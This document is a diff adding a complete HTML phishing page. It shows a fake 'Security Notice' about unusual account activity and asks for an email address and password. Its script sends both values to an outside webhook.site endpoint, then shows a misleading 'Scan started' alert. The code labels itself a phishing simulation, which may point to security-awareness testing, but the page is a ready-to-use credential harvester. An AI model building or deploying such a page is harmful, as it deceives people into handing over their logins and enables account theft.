@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Security Alert</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f9f9f9;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 50px;
+    }
+    .warning-box {
+      background: #fff3cd;
+      color: #856404;
+      padding: 20px;
+      border: 1px solid #ffeeba;
+      width: 400px;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    form {
+      background: #ffffff;
+      padding: 20px;
+      border: 1px solid #ccc;
+      width: 400px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    input[type="email"], input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+    }
+    input[type="submit"] {
+      background: #007bff;
+      color: white;
+      border: none;
+      padding: 10px;
+      width: 100%;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="warning-box">
+    <strong>⚠️ Security Notice:</strong><br />
+    We detected unusual activity on your account. Please verify to continue.
+  </div>
+
+  <form id="fakeForm">
+    <label>Email address:</label>
+    <input type="email" name="email" required placeholder="you@example.com" />
+    <label>Password:</label>
+    <input type="password" name="password" required placeholder="••••••••" />
+    <input type="submit" value="Start Scan" />
+  </form>
+
+  <script>
+    document.getElementById("fakeForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const email = e.target.email.value;
+      const password = e.target.password.value;
+
+      fetch("https://webhook.site/d828bfbf-ff5d-41db-956f-c8662ec8026a", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          email: email,
+          password: password,
+          timestamp: new Date().toISOString(),
+          source: "Phishing Simulation Page"
+        })
+      }).then(() => {
+        alert("Scan started. You will be logged out temporarily.");
+      });
+    });
+  </script>
+</body>
+</html>
